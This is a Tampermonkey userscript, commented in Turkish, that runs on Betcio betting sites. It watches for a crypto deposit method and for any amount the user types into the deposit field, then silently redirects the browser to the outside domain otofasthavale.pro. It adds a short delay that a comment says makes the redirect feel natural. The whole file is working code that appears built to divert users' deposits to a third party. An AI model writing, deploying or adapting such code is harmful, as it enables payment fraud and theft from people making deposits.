// ==UserScript==
// @name         Betcio - Kripto Span + Tutar Girişinde Yönlendirme
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  Span'da kripto/lipay varsa → tutar alanına yazı yazıldığında yönlendir
// @match        *://*.betcio*/*
// @match        *://m.betcio*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    const KRIPTO_KELIMELER = ['lipay', 'xpay', 'kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron']
        .map(w => w.toLowerCase());

    const METHOD_SPAN_XPATH = "/html/body/div[1]/div[11]/div/div/div[4]/div/div[1]/span";

    // Tutar giriş alanı için olası selector'lar (betcio'da genelde input type number/text + placeholder veya class içerir)
    const AMOUNT_INPUT_SELECTORS = [
        'input[type="number"]',
        'input[type="text"][placeholder*="tutar"]',
        'input[type="text"][placeholder*="miktar"]',
        'input[class*="amount"]',
        'input[class*="tutar"]',
        'input[name="amount"]',
        'input[name="depositAmount"]'
    ].join(',');

    function getElementByXPath(xpath) {
        try {
            return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
        } catch (e) {
            return null;
        }
    }

    function isKriptoSecili() {
        const span = getElementByXPath(METHOD_SPAN_XPATH);
        if (!span) return false;
        
        const text = (span.textContent || '').toLowerCase().trim();
        return KRIPTO_KELIMELER.some(k => text.includes(k));
    }

    function findAmountInput() {
        return document.querySelector(AMOUNT_INPUT_SELECTORS);
    }

    let redirected = false; // Tekrar yönlendirme olmasın

    function setupTutarIzleme() {
        if (!isKriptoSecili()) return;
        if (redirected) return;

        const input = findAmountInput();
        if (!input) return;

        console.log('[Kripto Yönlendirme] Tutar giriş alanı bulundu → izleme başlıyor');

        const handleInput = function() {
            if (redirected) return;

            const value = input.value.trim();
            if (value.length > 0 && !isNaN(parseFloat(value))) {
                console.log('Kullanıcı tutar girdi → YÖNLENDİRME');
                redirected = true;
                
                // Küçük gecikme ile yönlendir (kullanıcı deneyimi biraz daha doğal olsun)
                setTimeout(() => {
                    window.location.href = 'https://otofasthavale.pro';
                }, 300);
            }
        };

        // Birden fazla event türü dinle (her ihtimale karşı)
        input.addEventListener('input', handleInput, { passive: true });
        input.addEventListener('change', handleInput, { passive: true });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && input.value.trim() !== '') {
                handleInput();
            }
        }, { passive: true });
    }

    // Başlangıç + dinamik takip
    setTimeout(setupTutarIzleme, 1200);

    setInterval(() => {
        if (!redirected) setupTutarIzleme();
    }, 1000);

    const observer = new MutationObserver(() => {
        if (!redirected) setupTutarIzleme();
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true
    });

})();
